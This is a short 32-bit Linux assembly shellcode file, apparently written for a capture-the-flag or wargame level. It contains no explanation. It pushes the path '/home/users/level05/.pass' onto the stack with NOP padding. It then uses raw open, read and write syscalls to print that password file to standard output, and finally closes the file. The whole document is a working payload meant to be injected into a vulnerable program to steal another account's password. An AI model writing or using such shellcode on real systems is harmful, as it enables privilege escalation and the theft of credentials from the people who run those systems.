bits 32

section .text
	global _start

_start:
	xor  eax, eax
	push eax;
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x90909090
	push 0x00000073
	push 0x7361702e
	push 0x2f2f3530
	push 0x6c657665
	push 0x6c2f7372
	push 0x6573752f
	push 0x656d6f68
	push 0x2f2f2f2f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0x5
    int 0x80
    mov ebx, eax

    xor eax, eax
    mov ecx, esp
    mov dl, 0x80
    mov al, 0x3
    int 0x80

    mov al, 0x4
    mov bl, 0x1
    int 0x80

    xor eax, eax
    mov al, 0x6
    int 0x80
